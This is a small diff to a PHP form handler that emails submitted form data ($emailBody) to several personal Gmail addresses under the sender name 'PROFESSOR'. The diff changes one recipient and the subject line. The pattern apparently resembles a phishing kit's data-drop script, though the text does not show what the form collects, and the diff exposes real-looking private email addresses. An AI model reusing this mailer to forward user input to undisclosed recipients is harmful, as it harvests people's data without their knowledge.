@@ -36,7 +36,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('mixxmine07@gmail.com', 'PROFESSOR');
-        $mail->addAddress('officialo637@gmail.com');
+        $mail->addAddress('mariw4602@gmail.com');
          $mail->addAddress('mahboobalinizamani@gmail.com');
          $mail->addAddress('rnxsxnnxnx@gmail.com');
 
@@ -44,7 +44,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'WAHAB';
+        $mail->Subject = 'MAHEEN';
         $mail->Body = $emailBody; // Set the email body using the collected form data
         
         // Send email
